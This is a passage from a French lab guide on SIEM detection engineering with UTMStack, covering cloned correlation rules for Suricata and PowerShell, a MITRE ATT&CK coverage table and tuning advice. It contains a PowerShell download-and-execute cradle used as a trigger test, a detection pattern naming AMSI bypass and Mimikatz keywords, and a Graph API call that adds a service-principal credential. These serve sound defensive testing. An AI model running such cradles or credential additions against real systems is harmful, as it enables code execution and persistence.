POST https://graph.microsoft.com/v1.0/servicePrincipals/{id}/addPassword
Content-Type: application/json
{
  "passwordCredential": {
    "displayName": "test-m-new-2-validation"
  }
}

# Étape 3, Retirer le credential après validation
DELETE https://graph.microsoft.com/v1.0/servicePrincipals/{id}/removePassword
Content-Type: application/json
{
  "keyId": "{keyId retourné à l'étape 2}"
}
```

L'alerte contient `event.ModifiedProperties` avec `KeyDescription` (nom et identifiant du credential ajouté) et `event.Target` avec le nom de l'application ciblée.

---

## Clones de règles natives

La v11.3.0 apporte beaucoup de règles natives, et certaines produisent des faux positifs dans un environnement donné. Comme le backend réécrit les règles natives à chaque démarrage, l'exclusion ne peut pas être ajoutée directement en base : elle disparaîtrait au prochain redémarrage (voir [la méthode du clone](#corriger-une-règle-native--la-méthode-du-clone)). Chaque clone reprend la condition native mot pour mot, ajoute l'exclusion, et la règle native est désactivée par son nom :

```bash
PG=$(docker ps -qf name=postgres | head -1)
docker exec -i $PG psql -U postgres -d utmstack -c "UPDATE utm_correlation_rules SET rule_active=false WHERE rule_name='<nom exact de la règle native>' AND system_owner=true;"
```

Puis redémarrer les event-processors. Le backend conserve le statut inactif lors de ses resynchronisations : vérifié en redémarrant le backend après la désactivation.

**Contrepartie :** le clone ne suit plus les évolutions de la règle native. À chaque mise à jour d'UTMStack, comparer la définition native avec celle du clone et reporter les changements.

### Suricata : Medium level Suricata alert (clone de la 876)

La règle native se déclenche sur toute alerte Suricata de sévérité moyenne. Dans le lab, elle produisait des dizaines d'alertes par jour sur des balayages venus d'Internet vers le WAN, déjà bloqués par Suricata en mode IPS.

**Exclusions ajoutées :**

- le trafic entrant vers le WAN d'OPNsense (`192.168.1.203` dans le lab, à remplacer) **et** déjà bloqué (`event.alert.action = blocked`). Le trafic sortant bloqué reste détecté : un hôte du LAN qui tente de joindre une destination malveillante est un signal ;
- le trafic Microsoft Delivery Optimization, identifié par son agent HTTP.

**Autre correction :** la règle native déclarait `adversary: target`, ce qui présentait le WAN comme la source et l'attaquant comme la cible. Le clone utilise `adversary: origin`.

✅ **Statut v11.3.0 :** en service dans le lab depuis le 3 novembre 2026.

```yaml
name: Medium level Suricata alert (lab)
dataTypes:
  - suricata
impact:
  confidentiality: 2
  integrity: 2
  availability: 2
category: Discovery
technique: T1046 - Network Service Discovery
adversary: origin
references:
  - https://docs.suricata.io/en/latest/rules/meta.html
description: 'Alerte Suricata de sévérité moyenne : reconnaissance, anomalie de protocole ou tentative d''exploitation non bloquée. Next Steps: 1. Identifier la signature via event.alert.signature et sa catégorie. 2. Vérifier la direction du flux (event.direction) : un flux entrant vers le WAN 192.168.1.203 vise un service publié par NAT (reverse proxy nginx vers la sous-CA), un flux sortant désigne un hôte du LAN masqué derrière le NAT, à identifier dans les logs NAT d''OPNsense. 3. Contrôler si le flux a été bloqué (event.alert.action). 4. Pour un flux entrant, vérifier les logs du service ciblé et le code de réponse. 5. Pour un flux sortant, investiguer le processus à l''origine sur l''hôte du LAN. Note technique : clone de la règle native 876 (v11.3.0), qui exclut le trafic entrant vers le WAN déjà bloqué et le trafic Microsoft Delivery Optimization.'
where: |-
  equals("event.eventType", "alert") &&
  equals("severity", "warning") &&
  !(equals("target.ip", "192.168.1.203") && equals("event.alert.action", "blocked")) &&
  !contains("event.http.http_user_agent", "Microsoft-Delivery-Optimization")
afterEvents:
  - indexPattern: v11-log-suricata-*
    with:
      - field: target.ip
        operator: filter_term
        value: "{{.target.ip}}"
    or: null
    within: 15m
    count: 5
groupBy: []
deduplicateBy: []
```

### Windows : Suspicious PowerShell (clone de la 1424)

La règle native « Windows: Suspicious PowerShell (Encoded / Download Cradle / AMSI Bypass) » se déclenche sur le contenu des blocs de scripts (EID 4104). Dans le lab, elle a produit deux alertes sur DC01 : un script du dossier `DataCollection` de Microsoft Defender for Endpoint, le scanner Log4Shell (CVE-2021-44228) signé par Microsoft. Les deux alertes correspondent aux deux fragments 4104 du même script.

**Exclusion ajoutée :** les scripts exécutés depuis `…\Windows Defender Advanced Threat Protection\DataCollection\`. Écrire dans ce dossier demande les droits SYSTEM ou administrateur : l'exclusion ne réduit la couverture que face à un attaquant déjà privilégié. Le garde `exists("event.data.Path")` est nécessaire, car un bloc tapé dans une console ne porte pas de chemin.

✅ **Statut v11.3.0 :** validée sur DC01, après activation de la journalisation des blocs de scripts (voir les prérequis de collecte).

```yaml
name: Windows - Suspicious PowerShell (Encoded / Download Cradle / AMSI Bypass) (lab)
dataTypes:
  - wineventlog
impact:
  confidentiality: 2
  integrity: 3
  availability: 2
category: Execution
technique: 'T1059.001 - Command and Scripting Interpreter: PowerShell'
adversary: origin
references:
  - https://attack.mitre.org/techniques/T1059/001/
description: 'Contenu de script PowerShell à haut risque détecté dans un événement 4104 (Script Block Logging) : téléchargement suivi d''exécution (download cradle), exécution encodée ou masquée, chargement réflectif ou contournement d''AMSI. Next Steps: 1. Lire le contenu du script via event.eventDataScriptBlockText et son chemin via event.data.Path. 2. Identifier l''hôte via dataSource et le compte ayant lancé PowerShell. 3. Si le script télécharge du contenu, identifier l''URL et l''IP de destination, puis rechercher ces flux dans les logs OPNsense et Suricata. 4. Rechercher les autres fragments du même script (un long script produit plusieurs 4104 portant le même ScriptBlockId). 5. Isoler l''hôte si le script n''est pas légitime. Note technique : clone de la règle native 1424 (v11.3.0, version 1.3.0 du fournisseur). La condition native est conservée à l''identique, y compris l''exclusion du harnais d''instrumentation « sentinel ». Le clone exclut en plus les scripts exécutés depuis le dossier DataCollection de Microsoft Defender for Endpoint (scanner Log4Shell signé Microsoft, CVE-2021-44228). Écrire dans ce dossier demande les droits SYSTEM ou administrateur, l''exclusion ne réduit donc la couverture que face à un attaquant déjà privilégié.'
where: |-
  equals("event.eventCode", "4104") &&
  !(exists("event.data.Path") && contains("event.data.Path", "\\Windows Defender Advanced Threat Protection\\DataCollection\\")) &&
  !regexMatch("event.eventDataScriptBlockText", "(?i)(sentinelbreakpoints|windows.sentinel.[0-9]|po_wer_spl_oit_indicators)") &&
  (regexMatch("event.eventDataScriptBlockText", "(?i)(amsiutils|amsiinitfailed|amsiscanbuffer|virtualalloc|writeprocessmemory|getdelegateforfunctionpointer|invoke-mimikatz|invoke-shellcode|invoke-dllinjection|createremotethread)") || (regexMatch("event.eventDataScriptBlockText", "(?i)(downloadstring|downloadfile|downloaddata|invoke-webrequest|net.webclient|start-bitstransfer)") && regexMatch("event.eventDataScriptBlockText", "(?i)(iex|invoke-expression|-enc |-encodedcommand|-w hidden|-windowstyle hidden|frombase64string)")))
afterEvents: []
groupBy: []
deduplicateBy: []
```

**Test de déclenchement :** sur une machine où la journalisation des blocs de scripts est activée, dans une **nouvelle** console PowerShell :

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/test')
```

Rien n'écoute sur le port 1 : le téléchargement échoue, mais le bloc est journalisé avant son exécution et l'alerte se déclenche. Vérifier d'abord la présence du 4104 en local :

```powershell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104; StartTime=(Get-Date).AddMinutes(-5)} |
  Where-Object Message -match 'DownloadString'
```

---

## Matrice de couverture MITRE ATT&CK

Le tableau suivant récapitule les techniques ATT&CK déclarées dans le champ `technique` des fichiers YAML actifs en v11.3.0 (une technique par règle). Les règles retirées n'y figurent plus : leurs techniques sont couvertes par les règles natives qui les remplacent. Les règles Azure y figurent bien qu'elles ne soient pas revalidées. M13, non implémentable, figure pour mémoire.

| Technique | ID | Règles |
|---|---|---|
| OS Credential Dumping LSASS Memory | T1003.001 | S2 |
| OS Credential Dumping NTDS | T1003.003 | S4 |
| Rootkit | T1014 | W5b |
| Network Service Discovery | T1046 | Clone 876 |
| Scheduled Task | T1053.005 | W4 |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Clone 1424 |
| Software Deployment Tools | T1072 | A6 |
| Valid Accounts | T1078 | Impossible Travel |
| Valid Accounts Cloud Accounts | T1078.004 | A7, M14 |
| Account Manipulation | T1098 | W3 |
| Account Manipulation Additional Cloud Roles | T1098.003 | M6 |
| Brute Force | T1110 | W1 |
| Brute Force Password Guessing | T1110.001 | L1, Brute Force |
| Brute Force Password Spraying | T1110.003 | Password Spray |
| Email Collection Remote Email Collection | T1114.002 | M12 |
| Create Account Cloud Account | T1136.003 | M7 |
| User Execution | T1204 | WD4 |
| User Execution Malicious File | T1204.002 | MDE Malware Deleted, WD1 |
| System Binary Proxy Execution | T1218 | S1 |
| Data Destruction | T1485 | A2, A9, A11 |
| Steal Application Access Token | T1528 | M2 |
| System Shutdown/Reboot | T1529 | A3 |
| Steal Web Session Cookie | T1539 | Mailbox Activity |
| Create or Modify System Process Windows Service | T1543.003 | W5a |
| Boot or Logon Autostart Execution Registry Run Keys | T1547.001 | S5, S5b |
| Abuse Elevation Control Mechanism Sudo and Sudo Caching | T1548.003 | L2 |
| Pass the Hash | T1550.002 | W6 |
| Unsecured Credentials | T1552 | A1, A5 |
| Steal or Forge Kerberos Tickets Kerberoasting | T1558.003 | W7 |
| Inter-Process Communication Named Pipes | T1559.001 | S3 |
| Impair Defenses | T1562 | A10 |
| Impair Defenses Disable or Modify Tools | T1562.001 | WD2, WD3, WD5 |
| Impair Defenses Disable or Modify Cloud Firewall | T1562.007 | A4a, A4b |
| Impair Defenses Disable Cloud Logs | T1562.008 | A8, M8 |
| Exfiltration Over Web Service | T1567 | M10, M13 *(non implémentable)* |

---

## Note finale : Détection comportementale, CVE et complémentarité des outils

Ce chapitre illustre une approche de détection en trois axes :

**Détection comportementale pérenne** : les règles W1 à A6 documentées ici couvrent des techniques ATT&CK qui restent pertinentes indépendamment des CVE publiées. Une attaque par Kerberoasting (W7), par Pass-the-Hash (W6), par consentement OAuth malveillant (M2) ou par listing de clés Azure (A1) utilise les mêmes mécanismes depuis des années. Ces règles constituent le socle de détection permanent, indépendamment du calendrier des patchs.

**Réponse événementielle aux CVE critiques** : certaines vulnérabilités nécessitent une réponse immédiate dans la fenêtre entre publication et déploiement du patch. CVE-2026-41089 (Netlogon RCE, CVSS 9.8, publiée en mai 2026) affectait les DCs du lab sous Windows Server 2025 : la réponse adaptée est le patch des contrôleurs de domaine, distribué par Windows Update. CVE-2026-62869 (Entra ID Spoofing, août 2026) concerne un service cloud Microsoft : Impossible Travel et Mailbox Activity peuvent signaler des connexions anormales consécutives, sans détecter la vulnérabilité elle-même. CVE-2026-69836 (Entra ID RCE, CVSS 10.0, corrigée côté Microsoft, initialement signalée comme exploitée puis corrigée par Microsoft en « non exploitée ») illustre un cas différent : la vulnérabilité est dans l'infrastructure Microsoft elle-même, indétectable côté client. La réponse adaptée est un audit rétrospectif des journaux Entra ID (role assignments, credentials ajoutés sur des service principals, modifications de Conditional Access) et des règles comportementales couvrant les actions post-exploitation : M-new-1 et M-new-2 ont été ajoutées à cette fin, puis retirées en v11.3.0 au profit des règles natives qui couvrent les mêmes actions. La bonne pratique est d'évaluer si une règle existante couvre déjà le comportement exploité par la CVE avant d'en créer une nouvelle.

**Tuning continu** : les faux positifs identifiés lors des tests font partie du processus normal. Quelques exemples concrets issus de ce lab : VMware Tools qui accède légitimement à LSASS (S2), `PcaSvc.dll` qui charge rundll32 lors de diagnostics système (S1), la différence entre `Administrateurs` et `Administrators` selon la langue du système (W2), les services automatiques Azure qui listent régulièrement les clés de stockage (A1), et la boucle DLP/notification décrite en détail dans la section M ci-dessus. Chaque exclusion documentée améliore la précision sans sacrifier la couverture. L'approche défensive retenue, capturer large, exclure chirurgicalement, est préférable à une liste blanche de patterns dangereux.

**Revalider après chaque mise à jour** : la migration v11.3.0 a montré qu'une règle peut cesser de fonctionner sans le moindre message d'erreur. Elle a aussi révélé trois règles (S3, WD1, S4) qui n'avaient en réalité jamais fonctionné ou qui manquaient leur cible depuis leur publication, sans que rien ne le signale. Une règle n'est validée que par un événement de test réel qui produit une alerte. Après chaque mise à jour majeure d'UTMStack, rejouer les tests de ce chapitre, et vérifier au passage si une règle native nouvelle ne rend pas une règle personnalisée redondante.

**Complémentarité MDE et UTMStack** : MDE bloque en temps réel (S1 LOLBAS, S3 named pipes, S4 NTDS), UTMStack contextualise, corrèle et conserve la trace pour l'investigation. Les deux couches se sont illustrées tout au long de ce chapitre, une alerte MDE sans corrélation SIEM perd son contexte ; une règle SIEM sans EDR ne bloque rien. La valeur du lab est précisément de faire fonctionner ces deux systèmes ensemble sur des événements réels, pas en simulation.

---

*Toutes les règles YAML sont disponibles dans le dépôt [`rules/`](https://github.com/doit4everyone/utmstack-lab/tree/main/rules).*
